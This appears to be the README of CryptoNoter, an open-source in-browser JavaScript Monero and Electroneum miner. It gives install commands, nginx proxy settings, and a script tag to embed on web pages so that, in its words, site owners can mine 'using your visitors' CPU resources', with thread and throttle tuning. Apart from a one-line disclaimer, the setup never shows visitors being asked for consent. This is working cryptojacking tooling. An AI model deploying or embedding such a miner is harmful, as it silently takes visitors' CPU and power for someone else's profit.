## CryptoNoter In-Browser Javascript Web Miner
<img src='https://www.cryptonoter.com/img/logo-large.png'/><br />
`Open Source Project` `"Plug & Play" Installation` `Set Up Within 10 Mins`<br /><br />
Open Source In-Browser Javascript Web Miner For Websites / Support XMR & ETN Coins<br />
Built for in-browser javascript mining on any Monero (XMR) or Electroneum (ETN) pools. 0% Commission. Payout Towards Personal Wallet
* You can set up CryptoNoter wthin 10 minutes if you have basic knowledge of server set-up. If you are a newbie, you might need to take some time to set up CryptoNoter

## UPDATES
18/12/17 - Project has been modified and updated. CryptoNoter now supports mining for both Monero (XMR) and Electroneum (ETN) coins. This is a huge step forward for this project and i aim to support majority of the cryptonote currencies in future. Please consider a donation for my developments. You donation will support this project greatly. To update your miner, go to /srv/CryptoNoter and run git pull.

## Why This Open Source Project Is Created
* I hope that this project can act as a foundation for further developments into useful services. For example, it can be modified as a journalism gatekeeping mechanism or modified to help specific groups like graphic designers whom are offering their designs as royalty free or game developer offering background mining as a form of reward credit points to purchase in-game features. Let's think out of the box.

* Please do not abuse this project. It shouldn't be used without the user's consent or used for darkweb services. And i really do not wish to see my project being abused in illegal activities.

* If you would like to support this project and my ongoing developments, please consider making a donation using my wallet address at the bottom of this page. Thank you very much

* Follow me at CryptoNoter Facebook Page: https://www.facebook.com/cryptonoter/ for regular updates on future developments.

Facebook Page: https://www.facebook.com/cryptonoter<br />
Follow My Twitter: https://twitter.com/cryptonoter<br />
CryptoNoter Demo: https://www.cryptonoter.com/demo.php<br />
XMR Mining Pool (For Javascript Web Mining): https://pool.cryptonoter.com

## Requirements
The project is basically a "Plug & Play" installation. Most of the configurations are setup automatically when you run the installation. Simply follow the step by step installation. 

However, if you decide to modify or optimize CryptoNoter for maximum mining capabilities, you will need good knowledge on Nginx Reverse Proxy, javascript, etc. For example, we did approx 1550 H/s for a website with approx 15,000 visitors (Avg Time on Page: 55 secs / visitor) before optimization. After optimization, we are doing on avg 3500 H/s

`Minimum System Requirements`
1. Server with at least 1 CPU, 1 GB Ram & 8GB Harddisk [You will need better specs if you have higher traffic load]
2. Ubuntu(Debian) OS
3. Nginx, Nodejs, NPM & Forever Packages
4. SSL Support For Domain. Use https://certbot.eff.org/

* If you do not have an ideal choice of server host, you can use this link https://m.do.co/c/172e382f89a8 to sign up at DigitalOcean and get free $10 credit to start your test development. $10 credit should provide you a server with the minimum requirements and last for 2 months.

`IMPORTANT NOTE:` DO NOT USE GOOGLE COMPUTE ENGINE (GCE) or other related Google Cloud Services for crypto-mining services. It is in violation of their TOS. Google will suspend your account, lock your files and charge you for the usage. Been there, done that. So don't waste your precious time.

## Installation
Install CryptoNoter
```bash
curl https://raw.githubusercontent.com/cryptonoter/CryptoNoter/master/install.sh > install.sh
sudo sh install.sh
```

During the installation process, you are REQUIRED to specify your Monero Wallet Address. If you do not specify your wallet address, the installer will prompt you for it before proceeding with installation.

* Copy config_EXAMPLE.json to config.json<br />
I have force install.sh to prompt for your wallet address before proceeding with installation, however there are still concerns. This step is added to address the concerns that users might somehow still mine using my wallet address. I have also blank out my wallet address. Please use the following command to copy to config.json and then edit the config.json setting manually.
```bash
cp config_example.json config.json
```

* Install Control Panel (Vesta CP or Cpanel)
* Set Up Your Domain DNS Properly & Configure Firewalls
* Use CertBot To Assign SSL For Your Domain
* Login Via FTP and Upload The Files Within The `web` Folder To Your Domain

## Important
This is a Nginx Reverse Proxy server setup, YOU NEED TO ADD THE FOLLOWING TO YOUR NGINX.CONF file under the domain. Without the following configuration, it will not work.

```html
   location /proxy {  
  	add_header 'Access-Control-Allow-Origin' * always;
  	proxy_pass http://localhost:7777;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
      }
```

## Usage
* Run CryptoNoter server.js script
```bash
forever start /srv/CryptoNoter/server.js
```
* Make sure CryptoNoter server.js script is running on the server by using the command `forever list`
```bash
info:    Forever processes running
data:        uid  command       script                     forever pid  id logfile                 uptime
data:    [0] tX4L /usr/bin/node /srv/CryptoNoter/server.js 7379    7385    /root/.forever/tX4L.log 0:0:59:11.96
```
* Make sure you have uploaded the `web` folder to your domain public_html or domain root. Ensure you can access https://YOUR_DOMAIN_NAME/demo.html

* Change the settings for these files: worker.js, processor.js & lib/cryptonight-asmjs.min.js<br />
Replace %CryptoNoter_domain% with your DOMAIN_NAME in the 3 files. Including the following codes:

```html
self.CryptoNoter = self.CryptoNoter || {};
self.CryptoNoter.CONFIG = {
    LIB_URL: "https://%CryptoNoter_domain%/lib/",
    WEBSOCKET_SHARDS: [["wss://%CryptoNoter_domain%/proxy"]],
    CAPTCHA_URL: "https://%CryptoNoter_domain%/captcha/",
    MINER_URL: "https://%CryptoNoter_domain%/media/miner.html"
};
```

* Add the following javascript before the `</head>` tag onto webpages that you want the miner to run on. Remember to replace www.cryptonoter.com with your domain name. Else, you will be mining for my wallet
```html
<script src="https://www.cryptonoter.com/processor.js"></script>
<script>
    var miner = new CryptoNoter.Anonymous('CryptoNoter').start();
</script>
```
* Done! You can now start mining using your visitors' CPU resources by adding the above tag to any of your websites.
Have a look at CryptoNoter Demo: https://www.cryptonoter.com/demo.php

## JS Miner Documentation
There are parameters that you can preset within the javscript miner script.

*`autothreads(value)`
The number of threads the miner should start with. Set to true is to auto detect the number of CPU cores available on the user's computer.

*`throttle(value)`
Set the fraction of time that threads should be idle. A value of 0 means no throttling (i.e. full speed), a value of 0.5 means that threads will stay idle 50% of the time, with 0.8 they will stay idle 80% of the time.

Here are some basic configuration for the parameters:
```html
<script src="https://www.cryptonoter.com/processor.js"></script>
<script>
	var addr = 'CryptoNoter';
	var miner = new CryptoNoter.Anonymous(addr, {
        autoThreads: true,
	throttle: 0.8
	});
	miner.start();
</script>
```

## Troubleshooting
Check if server.js execute successfully by using this command
```bash
node /srv/CryptoNoter/server.js
```
If script executes successfully, it should show:
```bash
In-Browser Javascript XMR miner for websites / Payout towards personal XMR wallet
Built for in-browser javascript mining on any Monero pools. 0% Commission. 100% Payout

 Listen on : 127.0.0.1:7777
 Pool Host : pool.cryptonoter.com:1111
 Ur Wallet : YOUR_WALLET_ADDRESS
```
If script executes unsucessfully, it should show error logs. Troubleshoot by referring to the errors shown.
`For example:` The error log shown below means that the port 7777 is currently in use. `To resolve:` Simply listen to the port 7777, identify the process that is using the port and kill the process. Then try executing the script server.js again
```bash
Error: listen EADDRINUSE 127.0.0.1:7777
    at Object._errnoException (util.js:1024:11)
    at _exceptionWithHostPort (util.js:1046:20)
    at Server.setupListenHandle [as _listen2] (net.js:1351:14)
    at listenInCluster (net.js:1392:12)
    at doListen (net.js:1501:7)
    at _combinedTickCallback (internal/process/next_tick.js:141:11)
    at process._tickCallback (internal/process/next_tick.js:180:9)
    at Function.Module.runMain (module.js:678:11)
    at startup (bootstrap_node.js:187:16)
    at bootstrap_node.js:608:3
```
`Common Issues & Bugs:`
1. Port in use. Check if the port is listening?
2. Connection errors are commonly casused by iptables. Check your firewall settings
3. CryptoNoter not generating hashes. Check your config.json setting
4. Check the setting of nginx.conf, config.json, worker.js, processor.js & cryptonight-asmjs.min.js

For troubleshooting & debugging, you should open the issues at https://github.com/cryptonoter/CryptoNoter/issues/1 so that the community can replicate the bugs and help you out. I will be reading the issues frequently and will assist in troubleshooting.

## Future Developments
At this moment, I'm working to implement AEON mining into this project

## Mining Pool
Monero XMR Mining Pool (For Javascript Web Mining): https://pool.cryptonoter.com
* I am hosting a mining pool that i have modified to support javascript web mining. Use pool.cryptonoter.com:1111

Modified to suit the capabilities of low end devices. Var diff with mechanism to prevent high-end hardware from using low end port. Low end device enjoy low difficulty with 90% valid shares while high end hardware mine at best possible hashes.

In a low difficulty pool, miners submit shares more often and hence results in higher bandwidth costs. It will be costly for me to maintain a low difficulty pool, i would really appreciate a small donation to support this project.

Project has been modified and updated. CryptoNoter now supports mining on both Monero (XMR) or Electroneum (ETN) pools. To mine on ETN pools, simply change it to your ETN wallet address and point it to a Electroneum mining pool. Function is built into the project. No additional setting required.

Please consider making a donation using my wallet address at the bottom of this page. Thank you very much

## Installation/Configuration Assistance
If you need help installing the miner from scratch, please have your servers ready, which would be Ubuntu 16.04 servers, blank and clean, DNS records pointed. 

Installation assistance is 1 XMR, with a 0.5 XMR deposit, with remainder to be paid on completion.
Configuration & nginx optimization assistance is 1 XMR with a 0.5 XMR deposit, and include debugging your proxy configurations, ensuring that everything is running and tuned.

SSH access with a sudo-enabled user will be needed for installs, preferably the user that is slated to run the miner.

Please contact CryptoNoter at cryptonoter@gmail.com or facebook message at https://www.facebook.com/cryptonoter

## Donations To Support
* There is NO DEV FEE hardcoded to this project. Donation is as per your goodwill to support my development.
I am looking to add other cryptonote currencies support into this project and also to create a monero pool specifically for javascript browser mining. If you are interested in my future developments, i would really appreciate a small donation to support this project.
```html
My Monero Wallet Address (XMR)
42zXE5jcPpWR2J6pVRE39uJEqUdMWdW2H4if27wcS1bwUbBRTeSR5aDbAxP5KCjWueiZevjSBxqNZ36Q5ANPND3m4RJoeqX
```
```html
My Bitcoin Wallet Address (BTC)
34Z53zGc888pUYRsFtxgQxRVVLKwcWtjeP
```
```html
My Litecoin Wallet Address (LTC)
MJZZ9qq8ioAecyVDD7zMDStJXpY5thH2qC
```
```html
And if you prefer the traditional mode, you may donate to this project via PayPal by sending the donation to my PayPal email: cryptonoter@gmail.com
```

## License
MIT https://raw.github.com/cryptonoter/CryptoNoter/master/LICENSE

## Missions
Great things happen when we work together. The power of collaboration
